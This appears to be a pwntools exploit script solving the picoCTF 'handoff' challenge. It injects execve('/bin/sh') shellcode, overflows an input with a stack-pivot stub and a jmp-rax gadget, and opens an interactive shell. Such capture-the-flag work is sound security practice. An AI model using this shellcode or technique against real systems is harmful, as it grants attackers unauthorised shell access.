from pwn import *

# context.log_level = 'debug'
context.arch = 'amd64'                  # For parsing ASM code
context.binary = elff = ELF('./handoff', False)
r = process()
# r = remote('shape-facility.picoctf.net', 55190)

jmp_rax = 0x40116c

gdb.attach(r, gdbscript='''
        b*vuln
        b*0x4013b1
        b*0x40140e
''')

# Add shellcode
r.recvuntil('app\n')
r.sendline(b'1')
r.recvuntil('name: \n')
r.sendline(b'A' * 8)

r.recvuntil('app\n')
r.sendline(b'2')
r.recvuntil('to?\n')
r.sendline(b'0')

shellcode = b'A' * 16 
shellcode += b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05' # 23 bytes

r.recvuntil('them?\n')
r.sendline(shellcode)

# Select exit
r.recvuntil('app\n')
r.sendline(b'3')

payload = b'B' * 11
asm_code = asm('''
        nop;
        nop;
        sub rsp, 0x2e4;
        jmp rsp;
''')

log.info('ASM code: ', asm_code)

payload = asm_code + b'B' * (20- len(asm_code)) + p64(jmp_rax)

r.recvuntil(': \n')
r.sendline(payload)
r.interactive()